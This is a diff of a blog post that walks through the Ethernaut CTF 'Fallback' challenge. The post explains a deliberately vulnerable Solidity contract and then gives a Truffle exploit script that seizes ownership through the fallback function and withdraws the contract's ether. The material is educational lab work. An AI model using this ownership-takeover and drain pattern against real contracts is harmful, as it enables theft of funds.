@@ -28,7 +28,6 @@ In this case the line would mean: 'Hey, compile this Solidity code with **at lea
 /* Fallback.sol */
 
 import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
-
 ~~~
 
 Not so much to say about this line for now. It imports an existing contract called `Ownable.sol` to be used later as a base contract for the Fallback contract (contracts can inherit from others).
@@ -37,7 +36,6 @@ Not so much to say about this line for now. It imports an existing contract call
 ~~~solidity
 /* Fallback.sol */
 contract Fallback is Ownable { ... }
-
 ~~~
 
 If you ever declared a class in some other programming language, this should sound familiar. In Solidity, we call them **contracts**. Like a class, a contract can inherit from other(s). That can be done using the keyword `is`.
@@ -55,7 +53,6 @@ In Fallback, the `onlyOwner` modifier is used in the `withdraw` function:
 function withdraw() public onlyOwner {
     owner.transfer(this.balance);
 }
-
 ~~~
 
 Back with Ownable, looking at [the constructor function](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/746673a94f7e43835fcb5cb7b1af8ff1eea4e276/contracts/ownership/Ownable.sol#L25) (which is executed only the first time the contract is deployed) the initial owner of the contract will be the account (`msg.sender`) that deploys the contract to the network.
@@ -68,7 +65,6 @@ Remember that all of this functions, variables and modifiers are available in th
 ~~~solidity
 /* Fallback.sol */
 mapping(address => uint) public contributions;
-
 ~~~
 
 We have a [mapping](http://solidity.readthedocs.io/en/v0.4.21/types.html#mappings), something similar to a hash table, that associates each [address](http://solidity.readthedocs.io/en/v0.4.21/types.html#address) in it, with a [uint](http://solidity.readthedocs.io/en/v0.4.21/types.html#integers) number (`uint` and `uint256` are aliases).
@@ -85,7 +81,6 @@ function Fallback() public {
     // Initial contribution from the owner
     contributions[msg.sender] = 1000 * (1 ether);
 }
-
 ~~~
 Next, we find a pretty special function. The contract's constructor. How can I tell ?
 Well, because it has **the *exact* same name as the contract**. Let me be clear, **EXACT SAME NAME**. Some bad things can happen if contract and constructor's names do not match.
@@ -104,7 +99,6 @@ function contribute() public payable {
         owner = msg.sender;
     }
 }
-
 ~~~
 
 This piece of code defines a function named `contribute` which takes zero arguments, is `public` and `payable`.
@@ -127,7 +121,6 @@ function getContribution() public view returns (uint) {
 function withdraw() public onlyOwner {
     owner.transfer(this.balance);
 }
-
 ~~~
 
 `getContribution` allows the caller to just *see*, thus the `view` modifier, the total amount contributed by him/her. Note that in Solidity we have to explicitly specify what type of values a function returns (only if it actually *does* return a value). This is accomplished by means of the keyword `returns` followed by a list of one or more types (yeap, we can return multiple things from a single function).
@@ -139,14 +132,12 @@ One, `this.balance` references the current balance (in Wei) of the contract - yo
 Two, all variables of type `address` have a `transfer` function that takes a single argument, and it is used to ... guess what ? *transfer*, a certain amount of Wei from the contract to that particular address. Other ways to transfer ether to `address`es involve the use of methods such as `send` and `call`, but beware! They behave differently than `transfer` and can trigger, specially `call`, some unexpected and interesting behaviours. I can assure you that we will definitely cover more on this in later articles, like, **a lot more**. Just be patient.
 
 Finally, the Fallback contract ends with this strange, nameless, function:
-~~~solidity
+~~~
 /* Fallback.sol */
-
 function() payable public {
     require(msg.value > 0 && contributions[msg.sender] > 0);
     owner = msg.sender;
 }
-
 ~~~
 
 Weird, right?. Welcome to Solidity's **fallback functions** world.
@@ -186,7 +177,6 @@ let Fallback = artifacts.require('./Fallback.sol')
 module.exports = deployer => {
      deployer.deploy(Fallback)
 }
-
 ~~~
 
 Even though the above code is enough for now, you should refer to [Truffle's docs on Migrations](http://truffleframework.com/docs/getting_started/migrations) to gain more insights about the deployment scripts and how to exactly configure and use them.
@@ -223,7 +213,6 @@ It was earlier mentioned that Truffle already provides some global variables in 
 /* fallback.exploit.js */
 const FallbackContract = artifacts.require('Fallback')
 const assert = require('assert')
-
 ~~~
 
 According to [Truffle's docs on external scripts](http://truffleframework.com/docs/getting_started/scripts#file-structure), we ought to export a function that takes a callback as an argument. Moreover, that callback needs to be executed at the end of the script, like this:
@@ -239,7 +228,6 @@ async function execute(callback) {
 }
 
 module.exports = execute
-
 ~~~
 
 I know, nothing fancy yet. This is all Truffle-related stuff, let's call it the *structure* of our exploits. In fact, you'll see that we will always come back to this boilerplate in future tutorials, so keep it at hand. 
@@ -281,7 +269,6 @@ async function execute(callback) {
 }
 
 module.exports = execute
-
 ~~~
 
 Since, by default, our contracts are deployed using the first account provided by Truffle (`web3.eth.accounts[0]`), we are going to suppose that `web3.eth.accounts[0]` is the *victim* account. Our *attacker* account will be, in most cases, `web3.eth.accounts[1]`.
@@ -320,7 +307,6 @@ await contract.sendTransaction({
 contractOwner = await contract.owner.call()
 assert.equal(contractOwner, attacker)
 console.log(`Contract owner: ${contractOwner}`)
-
 ~~~
 
 As we earlier saw in Fallback.sol, anyone who calls its fallback function becomes the owner of the contract. Quick reminder:
@@ -330,7 +316,6 @@ function() public payable {
     require(msg.value > 0 && contributions[msg.sender] > 0);
     owner = msg.sender;
 }
-
 ~~~
 
 As in our exploit we're not calling any specific function, just sending a regular transaction to the contract with `contract.sendTransaction(...)`, the fallback's code is executed and we successfuly accomplish our objective. If the contract had any ether in it, we could now be able to withdraw all of it by simply doing:
@@ -343,7 +328,6 @@ let response = await contract.withdraw({
     from: attacker
 })
 console.log(`Withdrew all money in transaction ${response.tx}`)
-
 ~~~
 
 That's it!  You can now run `truffle exec exploits/fallback.exploit.js` to execute the exploit and pass the challenge.
@@ -351,4 +335,4 @@ That's it!  You can now run `truffle exec exploits/fallback.exploit.js` to execu
 Find the entire [exploit code of the Fallback contract at my GitHub repo](https://github.com/tinchoabbate/ethernaut-ctf/blob/master/exploits/fallback.exploit.js).
 
 
-If you enjoyed this first challenge, stay tuned! In the next post we will be tackling the next one: [Fallout](https://ethernaut.zeppelin.solutions/level/0x220beee334f1c1f8078352d88bcc4e6165b792f6).
+If you enjoyed this first challenge, stay tuned! In the [next post](https://www.hackingmood.com/ethereum/solving-zeppelin-ethernaut-ctf-fallout/) we will be tackling the next one: [Fallout](https://ethernaut.zeppelin.solutions/level/0x220beee334f1c1f8078352d88bcc4e6165b792f6).
